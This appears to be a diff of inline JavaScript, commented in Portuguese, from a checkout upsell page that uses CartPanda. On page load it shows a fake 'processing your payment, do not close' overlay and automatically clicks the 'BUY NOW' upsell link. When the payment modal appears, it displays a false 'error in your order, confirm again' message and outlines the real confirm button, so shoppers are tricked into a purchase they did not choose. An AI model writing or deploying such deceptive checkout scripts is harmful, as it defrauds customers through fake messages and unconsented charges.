@@ -11,119 +11,116 @@
   </script>
 
 	<script>
-	document.addEventListener('DOMContentLoaded', function() {
-	  // 1) Injeta CSS do overlay full-screen
+	document.addEventListener('DOMContentLoaded', () => {
+	  // --- 1) CSS do overlay, spinner e error message ---
 	  const style = document.createElement('style');
 	  style.innerHTML = `
 		#customOverlay {
-		  position: fixed; top: 0; left: 0;
-		  width: 100%; height: 100%;
+		  position: fixed; top:0; left:0;
+		  width:100%; height:100%;
 		  background: rgba(255,255,255,0.95);
 		  z-index: 999999;
 		  display: flex; flex-direction: column;
 		  justify-content: center; align-items: center;
-		  font-family: Arial, sans-serif;
-		  text-align: center;
+		  text-align: center; font-family: Arial, sans-serif;
+		  pointer-events: auto; /* bloqueia interações no início */
 		}
 		#customOverlay .spinner {
-		  border: 8px solid #f3f3f3;
-		  border-top: 8px solid #3498db;
-		  border-radius: 50%;
-		  width: 60px; height: 60px;
+		  border:8px solid #f3f3f3;
+		  border-top:8px solid #3498db;
+		  border-radius:50%;
+		  width:60px; height:60px;
 		  animation: spin 1s linear infinite;
-		  margin-bottom: 20px;
+		  margin-bottom:20px;
 		}
-		@keyframes spin {
-		  from { transform: rotate(0deg); }
-		  to   { transform: rotate(360deg); }
-		}
+		@keyframes spin { from{transform:rotate(0)} to{transform:rotate(360deg)} }
 		#customOverlay .message {
-		  font-size: 1.2em;
-		  margin: 5px 0;
+		  font-size:1.2em; margin:5px 0;
 		}
-		#customOverlay .buttons {
-		  margin-top: 20px;
-		  display: flex;
-		  gap: 10px;
-		}
-		#customOverlay .buttons button {
-		  padding: 10px 20px;
-		  font-size: 1em;
-		  cursor: pointer;
-		  border: none;
+		#customOverlay .error-msg {
+		  position: absolute;
+		  top:20px;
+		  left:50%;
+		  transform: translateX(-50%);
+		  background: #fff;
+		  padding: 12px 20px;
 		  border-radius: 4px;
-		}
-		#customOverlay #customDeclineBtn {
-		  background: #ccc;
-		  color: #000;
-		}
-		#customOverlay #customAcceptBtn {
-		  background: #28a745;
-		  color: #fff;
+		  box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+		  pointer-events: none; /* não captura clique */
+		  display: none;
+		  z-index: 1000000;
 		}
 	  `;
 	  document.head.appendChild(style);
 
-	  // 2) Cria overlay e adiciona ao <body>
+	  // --- 2) Cria overlay ---
 	  const overlay = document.createElement('div');
 	  overlay.id = 'customOverlay';
 	  overlay.innerHTML = `
 		<div class="spinner"></div>
 		<div class="message">NÃO FECHE NEM ATUALIZE A PÁGINA!</div>
 		<div class="message">PROCESSANDO SEU PAGAMENTO</div>
+		<div class="error-msg">
+		  HOUVE UM ERRO EM SEU PEDIDO,<br>
+		  CONFIRME NOVAMENTE CLICANDO NO BOTÃO ABAIXO
+		</div>
 	  `;
 	  document.body.appendChild(overlay);
 
-	  // 3) Após 1s, dispara clique no BUY NOW (accepted=yes)
+	  // --- 3) Após 1s, dispara BUY NOW ---
 	  setTimeout(() => {
-		const buyLink = document.querySelector('a.cta-button[href*="accepted=yes"]');
-		if (buyLink) {
-		  buyLink.click();
-		} else {
-		  console.warn('Auto-upsell: botão BUY NOW não encontrado');
-		}
+		const buy = document.querySelector('a.cta-button[href*="accepted=yes"]');
+		if (buy) buy.click();
+		else console.warn('Auto-upsell: BUY NOW não encontrado');
 	  }, 1000);
 
-	  // 4) Observa a injeção do modal da CartPanda
-	  const observer = new MutationObserver((mutations, obs) => {
+	  // --- 4) Observa chegada do modal CartPanda ---
+	  const obs = new MutationObserver((mutations, observer) => {
 		for (const m of mutations) {
 		  for (const node of m.addedNodes) {
-			if (node.nodeType === 1 &&
-			   (node.id === 'cartpanda-modal-container' ||
-				node.classList.contains('cartpanda-modal'))) {
-			  // 5) Modal apareceu → troca conteúdo do overlay
-			  overlay.innerHTML = `
-				<div class="message">
-				  HOUVE UM ERRO EM SEU PEDIDO,<br>
-				  CONFIRME NOVAMENTE CLICANDO NO BOTÃO ABAIXO
-				</div>
-				<div class="buttons">
-				  <button id="customDeclineBtn">NÃO, OBRIGADO</button>
-				  <button id="customAcceptBtn">SIM, CONFIRMAR</button>
-				</div>
-			  `;
-			  // 6) Liga nossos botões aos originais da CartPanda
-			  document
-				.getElementById('customDeclineBtn')
-				.addEventListener('click', () => {
-				  const declineBtn = document.getElementById('cartpanda-close-modal-btn');
-				  if (declineBtn) declineBtn.click();
-				  overlay.style.display = 'none';
+			if (node.nodeType===1 &&
+			   (node.id==='cartpanda-modal-container' || node.classList.contains('cartpanda-modal'))) {
+
+			  // 4.1) Esconde spinner/mensagens iniciais e mostra o texto de erro
+			  overlay.querySelector('.spinner').style.display = 'none';
+			  overlay.querySelectorAll('.message').forEach(el => el.style.display = 'none');
+			  const errMsg = overlay.querySelector('.error-msg');
+			  errMsg.style.display = 'block';
+
+			  // 4.2) Agora permite todos os cliques atravessarem
+			  overlay.style.pointerEvents = 'none';
+
+			  // 4.3) Destaca os dois botões da CartPanda com outline
+			  [
+				'#cartpanda-close-modal-btn',          // botão “NÃO, OBRIGADO”
+				'#cartpanda-payment-confirmation'      // botão “SIM, CONFIRMAR”
+			  ].forEach(sel => {
+				const real = document.querySelector(sel);
+				if (!real) return;
+				const r = real.getBoundingClientRect();
+				const highlight = document.createElement('div');
+				Object.assign(highlight.style, {
+				  position: 'fixed',
+				  top:    `${r.top}px`,
+				  left:   `${r.left}px`,
+				  width:  `${r.width}px`,
+				  height: `${r.height}px`,
+				  border: '2px dashed #3498db',
+				  borderRadius: '4px',
+				  pointerEvents: 'none',
+				  zIndex: 1000001
 				});
-			  document
-				.getElementById('customAcceptBtn')
-				.addEventListener('click', () => {
-				  const confirmBtn = document.getElementById('cartpanda-payment-confirmation');
-				  if (confirmBtn) confirmBtn.click();
-				  overlay.style.display = 'none';
-				});
-			  obs.disconnect();
+				document.body.appendChild(highlight);
+			  });
+
+			  observer.disconnect();
 			  return;
 			}
 		  }
 		}
 	  });
-	  observer.observe(document.body, { childList: true, subtree: true });
+
+	  obs.observe(document.body, { childList:true, subtree:true });
 	});
 	</script>
 
